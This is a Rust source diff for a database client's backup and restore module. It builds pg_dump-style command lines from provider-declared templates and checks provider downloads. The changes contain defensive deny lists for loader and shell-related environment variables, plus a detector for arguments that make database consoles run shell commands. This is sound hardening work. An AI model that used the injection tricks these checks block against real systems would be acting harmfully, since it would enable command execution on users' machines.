@@ -1,6 +1,6 @@
 //! Backups and restores through a database's own client programs, such as
-//! `pg_dump`. A driver describes its tasks and builds their command lines;
-//! the application finds the program and runs it.
+//! `pg_dump`. A driver declares its tasks, with a template of each command;
+//! the application fills the template, finds the program and runs it.
 
 use std::collections::BTreeMap;
 use std::fmt;
@@ -8,6 +8,7 @@ use std::fmt;
 use serde::{Deserialize, Serialize};
 
 use crate::error::{DbError, ErrorKind, Result};
+use crate::profile::{ConnectionProfile, SslMode};
 
 /// Programs a task may never name: shells, interpreters and launchers run
 /// whatever their arguments say, so a provider could escape its sandbox
@@ -109,11 +110,10 @@ const DENIED_ENV: &[&str] = &[
 const DENIED_ENV_PREFIXES: &[&str] = &["LD_", "DYLD_", "MALLOC", "GCONV", "LOCPATH"];
 
 /// Parts of variable names that point programs at files, folders or code
-/// to load (`PGPASSFILE`, `PGSERVICEFILE`, `PGSSLKEY`, `JAVA_OPTIONS`...).
+/// to load (`PGPASSFILE`, `PGSERVICEFILE`, `JAVA_OPTIONS`...).
 const DENIED_ENV_PARTS: &[&str] = &[
-    "FILE", "PATH", "DIR", "LIB", "HOME", "PRELOAD", "RC", "KEY", "CERT", "CRL", "EDITOR", "PAGER",
-    "SHELL", "OPT", "PLUGIN", "MODULE", "SCRIPT", "EXEC", "CMD", "COMMAND", "HOOK", "SERVICE",
-    "CONF",
+    "FILE", "PATH", "DIR", "LIB", "HOME", "PRELOAD", "RC", "EDITOR", "PAGER", "SHELL", "OPT",
+    "PLUGIN", "MODULE", "SCRIPT", "EXEC", "CMD", "COMMAND", "HOOK", "SERVICE", "CONF",
 ];
 
 /// Program names starting with these are interpreters whatever their
@@ -148,9 +148,26 @@ pub const INSPECT_HEAD: usize = 4096;
 /// How many of a folder's entries it is shown.
 pub const INSPECT_ENTRIES: usize = 64;
 
+/// The pseudo-setting conditions read the profile's TLS mode from.
+pub const SSL_SETTING: &str = "@ssl";
+
+/// Platforms downloads are offered for.
+pub const PLATFORMS: &[&str] = &[
+    "macos-aarch64",
+    "macos-x86_64",
+    "linux-x86_64",
+    "linux-aarch64",
+    "windows-x86_64",
+];
+
+/// The largest archive a provider may have downloaded.
+pub const MAX_DOWNLOAD: u64 = 256 << 20;
+
 const MAX_FIELDS: usize = 64;
 const MAX_PROGRAMS: usize = 8;
 const MAX_LOCATIONS: usize = 16;
+const MAX_COMMANDS: usize = 8;
+const MAX_PARTS: usize = 256;
 const MAX_ARGS: usize = 512;
 const MAX_ARG: usize = 32 << 10;
 const MAX_ENV: usize = 32;
@@ -200,20 +217,28 @@ pub enum FieldKind {
     Choice(Vec<Choice>),
 }
 
-/// Holds when `field` has one of `values`.
+/// Holds when `field` has one of `values`, or with `except`, none.
 #[derive(Clone, Debug, PartialEq, Eq)]
 pub struct Condition {
     pub field: String,
     pub values: Vec<String>,
+    pub except: bool,
 }
 
 impl Condition {
     #[must_use]
     pub fn holds(&self, settings: &TaskSettings) -> bool {
-        settings
+        let matched = settings
             .get(&self.field)
-            .is_some_and(|value| self.values.iter().any(|v| v == value))
+            .is_some_and(|value| self.values.iter().any(|v| v == value));
+        matched != self.except
     }
+}
+
+/// Whether every condition holds.
+#[must_use]
+pub fn all_hold(conditions: &[Condition], settings: &TaskSettings) -> bool {
+    conditions.iter().all(|condition| condition.holds(settings))
 }
 
 /// A task setting, as the dialog shows it.
@@ -226,15 +251,15 @@ pub struct Field {
     pub section: String,
     pub kind: FieldKind,
     pub default: String,
-    /// Shown only while this holds.
-    pub when: Option<Condition>,
+    /// Shown only while every condition holds.
+    pub when: Vec<Condition>,
 }
 
 impl Field {
     /// Whether the field applies with these settings.
     #[must_use]
     pub fn visible(&self, settings: &TaskSettings) -> bool {
-        self.when.as_ref().is_none_or(|when| when.holds(settings))
+        all_hold(&self.when, settings)
     }
 
     /// `value` if the field can hold it.
@@ -242,7 +267,7 @@ impl Field {
     pub fn accepts(&self, value: &str) -> bool {
         match &self.kind {
             FieldKind::Flag => value == "true" || value == "false",
-            FieldKind::Text => !value.contains('\0'),
+            FieldKind::Text => !value.contains('\0') && value.len() <= MAX_ARG,
             FieldKind::Number { min, max } => value
                 .parse::<i64>()
                 .is_ok_and(|n| (*min..=*max).contains(&n)),
@@ -264,19 +289,135 @@ pub enum PathKind {
 /// What a backup writes or a restore reads.
 #[derive(Clone, Debug, PartialEq, Eq)]
 pub struct Target {
-    pub when: Option<Condition>,
+    pub when: Vec<Condition>,
     pub kind: PathKind,
     /// Without the dot; empty for any.
     pub extension: String,
+}
+
+/// A setting's value, with listed values replaced.
+#[derive(Clone, Debug, PartialEq, Eq)]
+pub struct ValuePiece {
+    pub field: String,
+    pub map: Vec<(String, String)>,
+}
+
+/// Part of an argument or a variable's value.
+#[derive(Clone, Debug, PartialEq, Eq)]
+pub enum Piece {
+    Text(String),
+    Value(ValuePiece),
+    /// The chosen file or folder.
+    Path,
+    Host,
+    Port,
+    User,
+    Database,
+}
+
+/// An argument added when every condition holds; with `each`, once per
+/// comma-separated item of that text field.
+#[derive(Clone, Debug, PartialEq, Eq)]
+pub struct Argument {
+    pub when: Vec<Condition>,
+    pub pieces: Vec<Piece>,
+    pub each: Option<String>,
+}
+
+#[derive(Clone, Copy, Debug, PartialEq, Eq)]
+pub enum Quoting {
+    None,
+    Double,
+    Backtick,
+    Bracket,
+}
+
+impl Quoting {
+    #[must_use]
+    pub fn quote(self, name: &str) -> String {
+        match self {
+            Self::None => name.to_owned(),
+            Self::Double => format!("\"{}\"", name.replace('"', "\"\"")),
+            Self::Backtick => format!("`{}`", name.replace('`', "``")),
+            Self::Bracket => format!("[{}]", name.replace(']', "]]")),
+        }
+    }
+}
+
+/// One argument per picked schema or relation.
+#[derive(Clone, Debug, PartialEq, Eq)]
+pub struct ObjectArguments {
+    pub schema_prefix: String,
+    pub table_prefix: String,
+    pub quoting: Quoting,
+    /// Whole schemas, when relations are picked too: `table_prefix`, the
+    /// quoted schema and this.
+    pub schema_tables: Option<String>,
+}
+
+#[derive(Clone, Debug, PartialEq, Eq)]
+pub enum CommandPart {
+    Argument(Argument),
+    Objects(ObjectArguments),
+    /// Arguments the user typed in this text field.
+    Extra(String),
+}
+
+/// An environment variable set when every condition holds.
+#[derive(Clone, Debug, PartialEq, Eq)]
+pub struct Variable {
+    pub when: Vec<Condition>,
+    pub name: String,
+    pub pieces: Vec<Piece>,
+}
+
+/// How a program reaches the server.
+#[derive(Clone, Debug, PartialEq, Eq)]
+pub enum Binding {
+    Env(String),
+    /// One argument: the option, then the value.
+    Option(String),
+}
+
+/// The profile's connection, which the application passes itself.
+#[derive(Clone, Debug, Default, PartialEq, Eq)]
+pub struct Connection {
+    pub host: Option<Binding>,
+    pub port: Option<Binding>,
+    pub user: Option<Binding>,
+    pub database: Option<Binding>,
+    pub password_env: Option<String>,
+    /// A text field naming another database to use.
+    pub database_field: Option<String>,
+}
+
+impl Connection {
+    fn bindings(&self) -> impl Iterator<Item = &Binding> {
+        [&self.host, &self.port, &self.user, &self.database]
+            .into_iter()
+            .flatten()
+    }
+}
+
+/// A command line as a task declares it.
+#[derive(Clone, Debug, PartialEq, Eq)]
+pub struct CommandTemplate {
+    pub program: String,
+    pub when: Vec<Condition>,
+    pub parts: Vec<CommandPart>,
+    pub variables: Vec<Variable>,
+    pub stdout_to_path: bool,
+    pub stdin_from_path: bool,
 }
 
 /// A backup or restore a driver offers.
 #[derive(Clone, Debug, PartialEq, Eq)]
 pub struct Task {
     pub kind: TaskKind,
-    /// Programs its commands may run, by file name.
+    /// Programs its commands run, by file name.
     pub programs: Vec<String>,
-    /// Where the programs usually live; `*` stands for one folder name.
+    /// Where the programs usually live; `*` stands for part of a folder
+    /// name.
     pub locations: Vec<String>,
     /// Makes a program print its version.
     pub version_arg: Option<String>,
@@ -284,11 +425,85 @@ pub struct Task {
     /// The user picks schemas and relations.
     pub objects: bool,
     pub targets: Vec<Target>,
+    pub connection: Connection,
+    pub commands: Vec<CommandTemplate>,
+}
+
+/// Client programs to download with a provider.
+#[derive(Clone, Debug, PartialEq, Eq, Serialize, Deserialize)]
+pub struct Download {
+    pub platform: String,
+    pub url: String,
+    pub sha256: String,
+    pub size: u64,
+    pub label: String,
+    /// The top folder inside the archive.
+    pub root: String,
+    /// What to keep under `root`: files, or folders ending in `/`.
+    pub extract: Vec<String>,
+    /// The programs' folder under `root`.
+    pub bin: String,
+}
+
+impl Download {
+    /// The platform Violet runs on, as downloads name it.
+    #[must_use]
+    pub fn this_platform() -> Option<&'static str> {
+        match (std::env::consts::OS, std::env::consts::ARCH) {
+            ("macos", "aarch64") => Some("macos-aarch64"),
+            ("macos", "x86_64") => Some("macos-x86_64"),
+            ("linux", "x86_64") => Some("linux-x86_64"),
+            ("linux", "aarch64") => Some("linux-aarch64"),
+            ("windows", "x86_64") => Some("windows-x86_64"),
+            _ => None,
+        }
+    }
+
+    /// Checks a download a provider declared: a known platform, HTTPS, a
+    /// digest, a bounded size and plain relative paths.
+    pub fn check(&self) -> Result<()> {
+        let bad = |what: &str| Err(invalid(format!("download for {}: {what}", self.platform)));
+        if !PLATFORMS.contains(&self.platform.as_str()) {
+            return bad("unknown platform");
+        }
+        if !self.url.starts_with("https://") || !plain_text(&self.url) || self.url.len() > 2048 {
+            return bad("the address must be https://");
+        }
+        if self.sha256.len() != 64 || !self.sha256.bytes().all(|b| b.is_ascii_hexdigit()) {
+            return bad("needs a SHA-256 digest");
+        }
+        if self.size == 0 || self.size > MAX_DOWNLOAD {
+            return bad("unusable size");
+        }
+        if self.label.chars().count() > 80 || !plain_text(&self.label) {
+            return bad("unusable label");
+        }
+        let relative = |path: &str| {
+            !path.is_empty()
+                && path.len() <= 256
+                && plain_text(path)
+                && !path.starts_with('/')
+                && !path.contains('\\')
+                && !path.contains(':')
+                && path.split('/').all(|part| part != ".." && part != ".")
+        };
+        if !relative(&self.root)
+            || !relative(&self.bin)
+            || self.extract.is_empty()
+            || self.extract.len() > 64
+            || !self.extract.iter().all(|path| relative(path))
+        {
+            return bad("unusable paths");
+        }
+        Ok(())
+    }
 }
 
 impl Task {
-    /// Checks a description that came from a provider: names, sizes, and
-    /// that every default and condition makes sense.
+    /// Checks a description that came from a provider: names, sizes,
+    /// references, and that no fixed text can run other commands or point
+    /// the program at another server.
+    #[allow(clippy::too_many_lines)]
     pub fn check(&self) -> Result<()> {
         let bad = |what: String| Err(invalid(format!("{} task: {what}", self.kind)));
         if self.programs.is_empty() || self.programs.len() > MAX_PROGRAMS {
@@ -349,19 +564,105 @@ impl Task {
                 return bad(format!("setting {:?} has an invalid default", field.id));
             }
         }
-        let conditions = self
-            .fields
-            .iter()
-            .filter_map(|field| field.when.as_ref())
-            .chain(
-                self.targets
-                    .iter()
-                    .filter_map(|target| target.when.as_ref()),
-            );
-        for condition in conditions {
-            if !ids.contains(condition.field.as_str()) {
-                return bad(format!("a condition names {:?}", condition.field));
+        let kind_of = |id: &str| {
+            self.fields
+                .iter()
+                .find(|field| field.id == id)
+                .map(|field| &field.kind)
+        };
+        let is_text = |id: &str| matches!(kind_of(id), Some(FieldKind::Text));
+
+        // Connection: names, and what fixed text may not say.
+        let connection = &self.connection;
+        let mut connection_env = Vec::new();
+        let mut connection_options = Vec::new();
+        for binding in connection.bindings() {
+            match binding {
+                Binding::Env(name) if env_name_ok(name) => {
+                    connection_env.push(name.to_ascii_uppercase());
+                }
+                Binding::Option(option)
+                    if option.starts_with('-') && option.len() <= 32 && plain_text(option) =>
+                {
+                    connection_options.push(option.trim_end_matches('=').to_owned());
+                }
+                _ => return bad(format!("{binding:?} is not a usable connection binding")),
             }
+        }
+        if let Some(name) = &connection.password_env {
+            if !env_name_ok(name) {
+                return bad(format!("{name:?} is not a usable password variable"));
+            }
+            connection_env.push(name.to_ascii_uppercase());
+        }
+        if let Some(field) = &connection.database_field {
+            let empty = self
+                .fields
+                .iter()
+                .any(|f| f.id == *field && f.kind == FieldKind::Text && f.default.is_empty());
+            if !empty {
+                return bad(format!(
+                    "the database field {field:?} must be text, empty by default"
+                ));
+            }
+        }
+        // Fixed text reaches command lines as is: it may not run commands,
+        // and may not set the connection through another door.
+        let fixed_ok = |text: &str| {
+            let lower = text.to_ascii_lowercase();
+            plain_text(text)
+                && text.len() <= MAX_ARG
+                && !runs_commands(text)
+                && !connection_options
+                    .iter()
+                    .any(|option| lower.starts_with(&option.to_ascii_lowercase()))
+        };
+        for field in &self.fields {
+            let fixed: Vec<&str> = match &field.kind {
+                FieldKind::Choice(choices) => choices.iter().map(|c| c.value.as_str()).collect(),
+                FieldKind::Text => vec![field.default.as_str()],
+                _ => Vec::new(),
+            };
+            if let Some(text) = fixed.into_iter().find(|text| !fixed_ok(text)) {
+                return bad(format!("setting {:?} offers {text:?}", field.id));
+            }
+        }
+
+        let condition_ok = |condition: &Condition| {
+            condition.field == SSL_SETTING || ids.contains(condition.field.as_str())
+        };
+        let pieces_ok = |pieces: &[Piece], each: Option<&str>| -> std::result::Result<(), String> {
+            for piece in pieces {
+                match piece {
+                    Piece::Text(text) if !fixed_ok(text) => {
+                        return Err(format!("fixed text {text:?} is not allowed"));
+                    }
+                    Piece::Value(value) => {
+                        if kind_of(&value.field).is_none() {
+                            return Err(format!("a value names {:?}", value.field));
+                        }
+                        if let Some((_, to)) = value.map.iter().find(|(_, to)| !fixed_ok(to)) {
+                            return Err(format!("a value maps to {to:?}"));
+                        }
+                    }
+                    _ => {}
+                }
+            }
+            if let Some(field) = each
+                && !is_text(field)
+            {
+                return Err(format!("{field:?} repeats an argument but is not text"));
+            }
+            Ok(())
+        };
+
+        let fields_conditions = self.fields.iter().flat_map(|field| &field.when);
+        let target_conditions = self.targets.iter().flat_map(|target| &target.when);
+        if let Some(condition) = fields_conditions
+            .chain(target_conditions)
+            .find(|c| !condition_ok(c))
+        {
+            return bad(format!("a condition names {:?}", condition.field));
         }
         if self.targets.len() > 16
             || self.targets.iter().any(|target| {
@@ -370,6 +671,67 @@ impl Task {
             })
         {
             return bad("unusable targets".into());
+        }
+
+        if self.commands.is_empty() || self.commands.len() > MAX_COMMANDS {
+            return bad(format!("needs 1 to {MAX_COMMANDS} commands"));
+        }
+        for command in &self.commands {
+            if !self.programs.contains(&command.program) {
+                return bad(format!(
+                    "a command runs {:?}, not declared",
+                    command.program
+                ));
+            }
+            if command.stdout_to_path && command.stdin_from_path {
+                return bad("a command both reads and writes the path".into());
+            }
+            if command.parts.len() > MAX_PARTS || command.variables.len() > MAX_ENV {
+                return bad("a command is too long".into());
+            }
+            if let Some(condition) = command.when.iter().find(|c| !condition_ok(c)) {
+                return bad(format!("a condition names {:?}", condition.field));
+            }
+            for part in &command.parts {
+                let checked = match part {
+                    CommandPart::Argument(argument) => {
+                        if let Some(condition) = argument.when.iter().find(|c| !condition_ok(c)) {
+                            Err(format!("a condition names {:?}", condition.field))
+                        } else {
+                            pieces_ok(&argument.pieces, argument.each.as_deref())
+                        }
+                    }
+                    CommandPart::Objects(objects) => {
+                        if fixed_ok(&objects.schema_prefix)
+                            && fixed_ok(&objects.table_prefix)
+                            && objects.schema_tables.as_deref().is_none_or(fixed_ok)
+                        {
+                            Ok(())
+                        } else {
+                            Err("unusable object prefixes".into())
+                        }
+                    }
+                    CommandPart::Extra(field) if !is_text(field) => {
+                        Err(format!("extra arguments come from {field:?}, not text"))
+                    }
+                    CommandPart::Extra(_) => Ok(()),
+                };
+                if let Err(what) = checked {
+                    return bad(what);
+                }
+            }
+            for variable in &command.variables {
+                let upper = variable.name.to_ascii_uppercase();
+                if !env_name_ok(&variable.name) || connection_env.contains(&upper) {
+                    return bad(format!("a command may not set {:?}", variable.name));
+                }
+                if let Some(condition) = variable.when.iter().find(|c| !condition_ok(c)) {
+                    return bad(format!("a condition names {:?}", condition.field));
+                }
+                if let Err(what) = pieces_ok(&variable.pieces, None) {
+                    return bad(what);
+                }
+            }
         }
         Ok(())
     }
@@ -404,65 +766,252 @@ impl Task {
     pub fn target(&self, settings: &TaskSettings) -> Target {
         self.targets
             .iter()
-            .find(|target| target.when.as_ref().is_none_or(|when| when.holds(settings)))
+            .find(|target| all_hold(&target.when, settings))
             .cloned()
             .unwrap_or(Target {
-                when: None,
+                when: Vec::new(),
                 kind: PathKind::File,
                 extension: String::new(),
             })
     }
-}
 
-impl ToolCommand {
-    /// Checks a command a provider built for `task`: a program the task
-    /// declared, bounded arguments, and nothing in the environment that
-    /// changes what runs.
-    pub fn check(&self, task: &Task) -> Result<()> {
-        if !task.programs.contains(&self.program) || !program_name_ok(&self.program) {
-            return Err(invalid(format!(
-                "the command runs {:?}, which the {} task does not declare",
-                self.program, task.kind
-            )));
-        }
-        if self.args.len() > MAX_ARGS
-            || self
-                .args
-                .iter()
-                .any(|arg| arg.len() > MAX_ARG || arg.contains('\0'))
-        {
-            return Err(invalid("the command's arguments are unusable".into()));
-        }
-        if let Some(arg) = self.args.iter().find(|arg| runs_commands(arg)) {
-            return Err(invalid(format!(
-                "the argument {arg:?} could make the program run other commands"
-            )));
-        }
-        if self.env.len() > MAX_ENV {
-            return Err(invalid("the command sets too many variables".into()));
-        }
-        for name in self
-            .env
+    /// Fills the template: the command `request` runs against `profile`.
+    pub fn build(&self, profile: &ConnectionProfile, request: &TaskRequest) -> Result<ToolCommand> {
+        let mut settings = self.normalize(&request.settings);
+        let ssl = match profile.ssl.effective(&profile.host) {
+            SslMode::Disable => "disable",
+            SslMode::Prefer => "prefer",
+            SslMode::Require => "require",
+        };
+        settings.insert(SSL_SETTING.to_owned(), ssl.to_owned());
+        let database = self
+            .connection
+            .database_field
+            .as_ref()
+            .and_then(|field| settings.get(field))
+            .map(|value| value.trim().to_owned())
+            .filter(|value| !value.is_empty())
+            .unwrap_or_else(|| profile.database.clone());
+        let values = Values {
+            settings: &settings,
+            path: &request.path,
+            host: profile.host.trim(),
+            port: profile.port.to_string(),
+            user: &profile.username,
+            database: &database,
+        };
+        let template = self
+            .commands
             .iter()
-            .map(|(name, _)| name)
-            .chain(self.password_env.as_ref())
-        {
-            if !env_name_ok(name) {
-                return Err(invalid(format!("the command may not set {name:?}")));
+            .find(|command| all_hold(&command.when, &settings))
+            .ok_or_else(|| DbError::unsupported(format!("No {} for these settings", self.kind)))?;
+
+        let mut args = Vec::new();
+        let mut env = Vec::new();
+        let connection = [
+            (&self.connection.host, values.host),
+            (&self.connection.port, values.port.as_str()),
+            (&self.connection.user, values.user),
+            (&self.connection.database, values.database),
+        ];
+        for (binding, value) in connection {
+            match binding {
+                Some(_) if value.is_empty() => {}
+                Some(Binding::Env(name)) => env.push((name.clone(), value.to_owned())),
+                Some(Binding::Option(option)) => {
+                    // Clients read `key=value` and URIs in such options as
+                    // whole connection strings (libpq's `--dbname`), which
+                    // could name another server.
+                    if value.contains('=') || value.contains("://") || value.starts_with('-') {
+                        return Err(DbError::new(
+                            ErrorKind::Other,
+                            format!("{value:?} cannot be used as a connection value"),
+                        ));
+                    }
+                    args.push(format!("{option}{value}"));
+                }
+                None => {}
             }
         }
-        if self
-            .env
-            .iter()
-            .any(|(_, value)| value.contains('\0') || value.len() > MAX_ARG)
+        for part in &template.parts {
+            match part {
+                CommandPart::Argument(argument) if all_hold(&argument.when, &settings) => {
+                    match &argument.each {
+                        Some(field) => {
+                            let items = settings.get(field).cloned().unwrap_or_default();
+                            for item in items.split(',').map(str::trim).filter(|i| !i.is_empty()) {
+                                args.push(values.render(&argument.pieces, Some((field, item))));
+                            }
+                        }
+                        None => args.push(values.render(&argument.pieces, None)),
+                    }
+                }
+                CommandPart::Argument(_) => {}
+                CommandPart::Objects(objects) => {
+                    if self.objects {
+                        let mixed = request.objects.iter().any(|o| o.name.is_some());
+                        for object in &request.objects {
+                            let schema = objects.quoting.quote(&object.schema);
+                            args.push(match (&object.name, &objects.schema_tables) {
+                                (Some(name), _) => format!(
+                                    "{}{schema}.{}",
+                                    objects.table_prefix,
+                                    objects.quoting.quote(name)
+                                ),
+                                (None, Some(suffix)) if mixed => {
+                                    format!("{}{schema}{suffix}", objects.table_prefix)
+                                }
+                                (None, _) => format!("{}{schema}", objects.schema_prefix),
+                            });
+                        }
+                    }
+                }
+                CommandPart::Extra(field) => {
+                    args.extend(split_args(settings.get(field).map_or("", String::as_str)));
+                }
+            }
+        }
+        for variable in &template.variables {
+            if all_hold(&variable.when, &settings) {
+                env.push((variable.name.clone(), values.render(&variable.pieces, None)));
+            }
+        }
+        if args.len() > MAX_ARGS
+            || args
+                .iter()
+                .chain(env.iter().map(|(_, v)| v))
+                .any(|a| a.len() > MAX_ARG || a.contains('\0'))
         {
-            return Err(invalid("the command's variables are unusable".into()));
+            return Err(invalid("the command is too long or holds a NUL".into()));
         }
-        if self.stdout_to_path && self.stdin_from_path {
-            return Err(invalid("the command both reads and writes the path".into()));
-        }
-        Ok(())
+        Ok(ToolCommand {
+            program: template.program.clone(),
+            args,
+            env,
+            password_env: self.connection.password_env.clone(),
+            stdout_to_path: template.stdout_to_path,
+            stdin_from_path: template.stdin_from_path,
+        })
     }
+
+    /// Everything fixed this task can put on a command line, to show before
+    /// the user allows a provider's programs.
+    #[must_use]
+    pub fn vocabulary(&self) -> Vec<String> {
+        let mut words = std::collections::BTreeSet::new();
+        let mut pieces = |pieces: &[Piece]| {
+            let text: String = pieces
+                .iter()
+                .map(|piece| match piece {
+                    Piece::Text(text) => text.clone(),
+                    Piece::Value(value) => format!("<{}>", value.field),
+                    Piece::Path => "<path>".into(),
+                    Piece::Host => "<host>".into(),
+                    Piece::Port => "<port>".into(),
+                    Piece::User => "<user>".into(),
+                    Piece::Database => "<database>".into(),
+                })
+                .collect();
+            words.insert(text);
+        };
+        for command in &self.commands {
+            for part in &command.parts {
+                match part {
+                    CommandPart::Argument(argument) => pieces(&argument.pieces),
+                    CommandPart::Objects(objects) => {
+                        pieces(&[Piece::Text(format!("{}<schema>", objects.schema_prefix))]);
+                        pieces(&[Piece::Text(format!("{}<table>", objects.table_prefix))]);
+                    }
+                    CommandPart::Extra(field) => pieces(&[Piece::Text(format!("<{field}…>"))]),
+                }
+            }
+            for variable in &command.variables {
+                let mut all = vec![Piece::Text(format!("{}=", variable.name))];
+                all.extend(variable.pieces.iter().cloned());
+                pieces(&all);
+            }
+        }
+        words.into_iter().collect()
+    }
+}
+
+/// What template pieces stand for.
+struct Values<'a> {
+    settings: &'a TaskSettings,
+    path: &'a str,
+    host: &'a str,
+    port: String,
+    user: &'a str,
+    database: &'a str,
+}
+
+impl Values<'_> {
+    /// `pieces` joined; `item` stands for one field's value.
+    fn render(&self, pieces: &[Piece], item: Option<(&String, &str)>) -> String {
+        pieces
+            .iter()
+            .map(|piece| match piece {
+                Piece::Text(text) => text.clone(),
+                Piece::Value(value) => {
+                    let raw = match item {
+                        Some((field, item)) if *field == value.field => item,
+                        _ => self.settings.get(&value.field).map_or("", String::as_str),
+                    };
+                    value
+                        .map
+                        .iter()
+                        .find(|(from, _)| from == raw)
+                        .map_or(raw, |(_, to)| to.as_str())
+                        .to_owned()
+                }
+                Piece::Path => self.path.to_owned(),
+                Piece::Host => self.host.to_owned(),
+                Piece::Port => self.port.clone(),
+                Piece::User => self.user.to_owned(),
+                Piece::Database => self.database.to_owned(),
+            })
+            .collect()
+    }
+}
+
+/// Splits arguments the user typed as a shell would, without running one:
+/// whitespace separates, quotes group, a backslash escapes the next
+/// character outside single quotes.
+#[must_use]
+pub fn split_args(text: &str) -> Vec<String> {
+    let mut args = Vec::new();
+    let mut current = String::new();
+    let mut started = false;
+    let mut chars = text.chars();
+    let mut quote: Option<char> = None;
+    while let Some(c) = chars.next() {
+        match (quote, c) {
+            (Some(q), c) if c == q => quote = None,
+            (Some('\''), c) => current.push(c),
+            (_, '\\') => {
+                if let Some(next) = chars.next() {
+                    current.push(next);
+                }
+                started = true;
+            }
+            (Some(_), c) => current.push(c),
+            (None, '\'' | '"') => {
+                quote = Some(c);
+                started = true;
+            }
+            (None, c) if c.is_whitespace() => {
+                if started || !current.is_empty() {
+                    args.push(std::mem::take(&mut current));
+                }
+                started = false;
+            }
+            (None, c) => current.push(c),
+        }
+    }
+    if started || !current.is_empty() {
+        args.push(current);
+    }
+    args
 }
 
 /// Arguments that make database consoles run shell commands or write
@@ -478,9 +1027,16 @@ fn runs_commands(arg: &str) -> bool {
     if lower.contains('|') || lower.contains("\\!") || lower.contains("program ") {
         return true;
     }
-    if lower
+    // `system <command>` (mysql); a lone `system`, such as libpq's
+    // `sslrootcert=system`, runs nothing.
+    let words: Vec<&str> = lower
         .split(|c: char| c == '=' || c.is_whitespace())
-        .any(|word| word == "system")
+        .filter(|word| !word.is_empty())
+        .collect();
+    if words
+        .iter()
+        .take(words.len().saturating_sub(1))
+        .any(|word| *word == "system")
     {
         return true;
     }
@@ -572,7 +1128,7 @@ pub struct ObjectRef {
     pub name: Option<String>,
 }
 
-/// A task to build a command for.
+/// A task to run, as the user set it up.
 #[derive(Clone, Debug, PartialEq, Eq)]
 pub struct TaskRequest {
     pub kind: TaskKind,
@@ -583,8 +1139,7 @@ pub struct TaskRequest {
     pub path: String,
 }
 
-/// A program to run, as a driver asks for it. Untrusted until the
-/// application checks it.
+/// A program to run, as [`Task::build`] filled it in.
 #[derive(Clone, Debug, PartialEq, Eq)]
 pub struct ToolCommand {
     /// A program of the task's, by name.
@@ -602,20 +1157,51 @@ pub struct ToolCommand {
 #[cfg(test)]
 mod tests {
     use super::*;
+    use crate::profile::DriverId;
 
+    fn when(field: &str, values: &[&str]) -> Vec<Condition> {
+        vec![Condition {
+            field: field.into(),
+            values: values.iter().map(|v| (*v).to_owned()).collect(),
+            except: false,
+        }]
+    }
+
+    fn text(t: &str) -> Piece {
+        Piece::Text(t.into())
+    }
+
+    fn arg(when: Vec<Condition>, pieces: Vec<Piece>) -> CommandPart {
+        CommandPart::Argument(Argument {
+            when,
+            pieces,
+            each: None,
+        })
+    }
+
+    fn field(id: &str, kind: FieldKind, default: &str) -> Field {
+        Field {
+            id: id.into(),
+            label: id.into(),
+            help: String::new(),
+            section: "S".into(),
+            kind,
+            default: default.into(),
+            when: Vec::new(),
+        }
+    }
+
+    /// A small pg_dump-like task.
     fn task() -> Task {
         Task {
             kind: TaskKind::Backup,
             programs: vec!["pg_dump".into()],
-            locations: Vec::new(),
-            version_arg: None,
+            locations: vec!["/usr/lib/postgresql/*/bin".into()],
+            version_arg: Some("--version".into()),
             fields: vec![
-                Field {
-                    id: "format".into(),
-                    label: "Format".into(),
-                    help: String::new(),
-                    section: "Output".into(),
-                    kind: FieldKind::Choice(vec![
+                field(
+                    "format",
+                    FieldKind::Choice(vec![
                         Choice {
                             value: "custom".into(),
                             label: "Custom".into(),
@@ -625,146 +1211,377 @@ mod tests {
                             label: "Directory".into(),
                         },
                     ]),
-                    default: "custom".into(),
-                    when: None,
-                },
+                    "custom",
+                ),
                 Field {
-                    id: "jobs".into(),
-                    label: "Jobs".into(),
-                    help: String::new(),
-                    section: "Output".into(),
-                    kind: FieldKind::Number { min: 1, max: 8 },
-                    default: "1".into(),
-                    when: Some(Condition {
-                        field: "format".into(),
-                        values: vec!["directory".into()],
-                    }),
+                    when: when("format", &["directory"]),
+                    ..field("jobs", FieldKind::Number { min: 1, max: 8 }, "1")
                 },
+                field("skip", FieldKind::Text, ""),
+                field("extra", FieldKind::Text, ""),
+                field("verify", FieldKind::Flag, "true"),
             ],
             objects: true,
             targets: vec![
                 Target {
-                    when: Some(Condition {
-                        field: "format".into(),
-                        values: vec!["directory".into()],
-                    }),
+                    when: when("format", &["directory"]),
                     kind: PathKind::Directory,
                     extension: String::new(),
                 },
                 Target {
-                    when: None,
+                    when: Vec::new(),
                     kind: PathKind::File,
                     extension: "dump".into(),
                 },
             ],
+            connection: Connection {
+                host: Some(Binding::Env("PGHOST".into())),
+                port: Some(Binding::Env("PGPORT".into())),
+                user: Some(Binding::Env("PGUSER".into())),
+                database: Some(Binding::Option("--dbname=".into())),
+                password_env: Some("PGPASSWORD".into()),
+                database_field: None,
+            },
+            commands: vec![CommandTemplate {
+                program: "pg_dump".into(),
+                when: Vec::new(),
+                parts: vec![
+                    arg(
+                        Vec::new(),
+                        vec![
+                            text("--format="),
+                            Piece::Value(ValuePiece {
+                                field: "format".into(),
+                                map: vec![
+                                    ("custom".into(), "c".into()),
+                                    ("directory".into(), "d".into()),
+                                ],
+                            }),
+                        ],
+                    ),
+                    arg(
+                        vec![
+                            when("format", &["directory"]).remove(0),
+                            Condition {
+                                field: "jobs".into(),
+                                values: vec!["1".into()],
+                                except: true,
+                            },
+                        ],
+                        vec![
+                            text("--jobs="),
+                            Piece::Value(ValuePiece {
+                                field: "jobs".into(),
+                                map: Vec::new(),
+                            }),
+                        ],
+                    ),
+                    CommandPart::Argument(Argument {
+                        when: Vec::new(),
+                        pieces: vec![
+                            text("--exclude-table="),
+                            Piece::Value(ValuePiece {
+                                field: "skip".into(),
+                                map: Vec::new(),
+                            }),
+                        ],
+                        each: Some("skip".into()),
+                    }),
+                    arg(Vec::new(), vec![text("--file="), Piece::Path]),
+                    CommandPart::Objects(ObjectArguments {
+                        schema_prefix: "--schema=".into(),
+                        table_prefix: "--table=".into(),
+                        quoting: Quoting::Double,
+                        schema_tables: Some(".*".into()),
+                    }),
+                    CommandPart::Extra("extra".into()),
+                ],
+                variables: vec![
+                    Variable {
+                        when: vec![
+                            when(SSL_SETTING, &["require"]).remove(0),
+                            when("verify", &["true"]).remove(0),
+                        ],
+                        name: "PGSSLMODE".into(),
+                        pieces: vec![text("verify-full")],
+                    },
+                    Variable {
+                        when: when(SSL_SETTING, &["disable"]),
+                        name: "PGSSLMODE".into(),
+                        pieces: vec![text("disable")],
+                    },
+                ],
+                stdout_to_path: false,
+                stdin_from_path: false,
+            }],
+        }
+    }
+
